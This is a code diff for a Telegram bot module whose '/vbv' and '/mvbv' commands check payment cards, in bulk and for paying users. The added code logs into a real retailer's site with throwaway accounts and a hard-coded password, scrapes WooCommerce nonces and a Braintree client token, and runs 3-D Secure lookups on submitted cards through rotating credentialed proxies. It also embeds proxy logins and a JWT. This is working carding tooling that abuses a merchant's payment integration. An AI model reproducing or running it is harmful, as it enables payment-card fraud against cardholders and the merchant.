@@ -1,41 +1,31 @@
-import time
+import os
 import re
+import time
+import json
+import base64
 import random
-import aiohttp
 import asyncio
-import requests
 import traceback
-from pyrogram import Client, filters
-from EQUROBOT import app
-from EQUROBOT.core.mongo import has_premium_access
-from fake_useragent import UserAgent
 from collections import defaultdict
+import jwt
+import aiohttp
+import requests
+from pyrogram import Client, filters
+from fake_useragent import UserAgent
+from EQUROBOT import app
 from config import OWNER_ID
-
-user_request_times = defaultdict(list)
-
-user_agent = UserAgent()
-user = user_agent.random
-
-au = "eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3Mjg0MDkzMjQsImp0aSI6ImJkODE2ZjE3LWUwNzktNDA4YS05MWZlLTIwNjNlZmM0ZWFkMyIsInN1YiI6IndjcjNjdmMyMzdxN2p6NmIiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6IndjcjNjdmMyMzdxN2p6NmIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.UOfeo66q42Oc7ygaww6XrEFcMmb1EcpkU2uXQ7RZdLFY1jcetH0UkaWGdZI-mjpI9it3PGu1gPMZqFX53Wo4YA"
+from EQUROBOT.core.mongo import has_premium_access 
 
 proxy_list = [
-    "http://tickets:proxyon145@107.172.229.182:12345",
-    "http://tickets:proxyon145@104.160.17.116:12345",
-    "http://tickets:proxyon145@198.46.172.86:12345",
-    "http://tickets:proxyon145@50.3.137.165:12345",
-    "http://tickets:proxyon145@162.212.170.77:12345",
-    "http://tickets:proxyon145@23.94.251.43:12345",
-    "http://tickets:proxyon145@162.212.170.252:12345",
-    "http://tickets:proxyon145@104.206.81.209:12345",
-    "http://tickets:proxyon145@23.104.162.39:12345",
-    "http://tickets:proxyon145@192.227.241.115:12345",
+    "http://nzvuwsmz:yS6ks569Hy@65.181.174.194:63829",
+    "http://nzvuwsmz:yS6ks569Hy@65.181.171.160:62110",
+    "http://nzvuwsmz:yS6ks569Hy@65.181.167.98:63631",
+    "http://nzvuwsmz:yS6ks569Hy@65.181.170.115:60681",
+    "http://nzvuwsmz:yS6ks569Hy@65.181.172.225:59225"
 ]
-
 
 def get_random_proxy():
     return {"http": random.choice(proxy_list), "https": random.choice(proxy_list)}
-
 
 async def get_bin_info(bin_number):
     url = f"https://bins.antipublic.cc/bins/{bin_number}"
@@ -59,14 +49,80 @@ async def get_bin_info(bin_number):
         except aiohttp.ClientError:
             return "Error parsing BIN info", "N/A", "N/A", "N/A", "N/A", "N/A"
 
+def is_au_valid(au):
+    try:
+        decoded_au = jwt.decode(au, options={"verify_signature": False})
+        exp = decoded_au.get('exp')
+        if exp:
+            current_time = int(time.time())
+            if exp > current_time:
+                return True
+        return False
+    except Exception as e:
+        print(f"Error decoding 'au': {str(e)}")
+        return False
 
-async def check_card(card_info, message):
+def load_session_data():
+    if os.path.exists('session_data.json'):
+        with open('session_data.json', 'r') as f:
+            return json.load(f)
+    return None
+
+def save_session_data(data):
+    with open('session_data.json', 'w') as f:
+        json.dump(data, f)
+
+async def check_card(card_info, message, user_level):
     card = card_info.split("|")
     if len(card) != 4 or not all(card):
         return "Invalid card details. Please use the format: card_number|mm|yy|cvv"
 
     cc, mm, yy, cvv = card
     start_time = time.time()
+
+    user_agent = UserAgent()
+    user = user_agent.random
+
+    session_data = load_session_data()
+    if session_data and is_au_valid(session_data.get('au')):
+        au = session_data['au']
+        print("Using cached 'au' value.")
+    else:
+        print("Performing login to obtain new 'au' token...")
+        acc = ['sophia534201@promail.fun', 'hunter227312@newmail.online']
+        email = random.choice(acc)
+        r = requests.session()
+        headers = {'user-agent': user}
+        response = r.post('https://hakko.co.uk/my-account/add-payment-method/', headers=headers)
+        nonce_match = re.search(r'name="woocommerce-login-nonce" value="(.*?)"', response.text)
+        if not nonce_match:
+            print("Failed to extract login nonce.")
+            return "Failed to extract login nonce."
+        nonce = nonce_match.group(1)
+        print("Starting Login Extracted ✅", nonce)
+        data = {
+            'username': email,
+            'password': 'qFjbaeWjjGEMz5bU',
+            'woocommerce-login-nonce': nonce,
+            '_wp_http_referer': '/my-account/add-payment-method/',
+            'login': 'Log in',
+        }
+        response = r.post('https://hakko.co.uk/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
+        nonce_matches = re.findall(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', response.text)
+        if not nonce_matches:
+            return "Failed to extract add-payment-method nonce."
+        nonce = nonce_matches[0]
+        enc_match = re.search(r'var wc_braintree_client_token = \["(.*?)"\];', response.text)
+        if not enc_match:
+            return "Failed to extract Braintree client token."
+        enc = enc_match.group(1)
+        dec = base64.b64decode(enc).decode('utf-8')
+        au_matches = re.findall(r'"authorizationFingerprint":"(.*?)"', dec)
+        if not au_matches:
+            return "Failed to extract authorization fingerprint."
+        au = au_matches[0]
+        session_data = {'au': au}
+        save_session_data(session_data)
 
     headers = {
         "accept": "*/*",
@@ -177,7 +233,7 @@ async def check_card(card_info, message):
                 "email": "n62bqm@qacmjeq.com",
             },
             "challengeRequested": True,
-            "bin": "446966",
+            "bin": cc[:6],
             "dfReferenceId": "0_d58bc780-01fc-4114-819f-7dddc3e1b0b6",
             "clientMetadata": {
                 "requestedThreeDSecureVersion": "2",
@@ -186,7 +242,7 @@ async def check_card(card_info, message):
                 "issuerDeviceDataCollectionTimeElapsed": 901,
                 "issuerDeviceDataCollectionResult": True,
             },
-            'authorizationFingerprint': au,
+            "authorizationFingerprint": au,
             "braintreeLibraryVersion": "braintree/web/3.106.0",
             "_meta": {
                 "merchantAppId": "hakko.co.uk",
@@ -206,7 +262,6 @@ async def check_card(card_info, message):
             proxies=proxy,
         )
         lookup_response_data = lookup_response.json()
-        print(lookup_response_data)
         msg = (
             lookup_response_data.get("paymentMethod", {})
             .get("threeDSecureInfo", {})
@@ -264,34 +319,35 @@ async def check_card(card_info, message):
         error_type = f"Error Type: {type(e).__name__}\n"
         traceback_details = traceback.format_exc()
         full_error = error_message + error_type + traceback_details
-        print(full_error)
         return "An internal error occurred, please try again later."
 
 
 card_pattern = re.compile(r"(\d{15,16})[|/:](\d{2})[|/:](\d{2,4})[|/:](\d{3,4})")
 
 
-@app.on_message(filters.command("vbv", prefixes=[".", "/", "!"]))
-async def vbv_check_handler(client, message):
-    user_id = message.from_user.id
-
-    if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
-        return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")
-
-    
-
+def extract_card_info(message):
+    card_info = None
+    if message.reply_to_message:
+        card_info = re.search(card_pattern, message.reply_to_message.text)
+        return card_info.group() if card_info else None
     try:
         card_info = message.text.split(maxsplit=1)[1].strip()
     except IndexError:
-        await message.reply(
-            "Please provide the card details in the format: `card_number|mm|yy|cvv`"
-        )
-        return
+        pass
+    return card_info
 
-    if not card_pattern.fullmatch(card_info):
-        await message.reply(
-            "Invalid format. Please provide the card details in the format: `card_number|mm|yy|cvv`."
-        )
+
+@app.on_message(filters.command("vbv", prefixes=[".", "/", "!"]))
+async def vbv_check_handler(client, message):
+    user_id = message.from_user.id
+ 
+    if not await has_premium_access(message.from_user.id) and message.from_user.id != OWNER_ID:
+        return await message.reply_text("You don't have premium access. Contact my owner to purchase premium.")
+
+    card_info = extract_card_info(message)
+
+    if not card_info or not card_pattern.match(card_info):
+        await message.reply("Please provide valid card details in the format: `card_number|mm|yy|cvv`")
         return
 
     processing_msg = await message.reply("Processing your request...")
@@ -301,4 +357,45 @@ async def vbv_check_handler(client, message):
         await processing_msg.edit_text(response)
     except Exception as e:
         await processing_msg.edit_text(f"An error occurred: {str(e)}")
-        
+
+@app.on_message(filters.command("mvbv", prefixes=[".", "/", "!"]))
+async def mvbv_check_handler(client, message):
+    user_id = message.from_user.id
+
+    has_access, error_message, user_level = await has_premium_access(user_id, required_credits=1)
+    user_level = user_level if user_level else "Free User"
+    if not has_access:
+        await message.reply_text(error_message)
+        return
+
+    card_text = extract_card_info(message)
+
+    if not card_text:
+        await message.reply("Please provide card details in the format:\n`/mvbv card1\ncard2\ncard3`")
+        return
+
+    card_lines = [line.strip() for line in card_text.split('\n') if line.strip()]
+
+    if len(card_lines) > 6:
+        await message.reply("You can check up to 6 cards at a time.")
+        return
+
+    tasks = [
+        check_card(card_info, message, user_level)
+        for card_info in card_lines if card_pattern.fullmatch(card_info)
+    ]
+
+    if len(tasks) < len(card_lines):
+        await message.reply("Invalid card format found. Use: `card_number|mm|yy|cvv`")
+        return
+
+    processing_msg = await message.reply("Processing your request...")
+
+    results = await asyncio.gather(*tasks)
+    combined_results = "𝗠𝗮𝘀𝘀 𝗩𝗕𝗩 𝗟𝗼𝗼𝗸𝘂𝗽\n\n" + "\n\n\n".join(results)
+
+    if len(combined_results) > 4096:
+        for chunk in [combined_results[i:i + 4000] for i in range(0, len(combined_results), 4000)]:
+            await message.reply(chunk)
+    else:
+        await processing_msg.edit_text(combined_results)
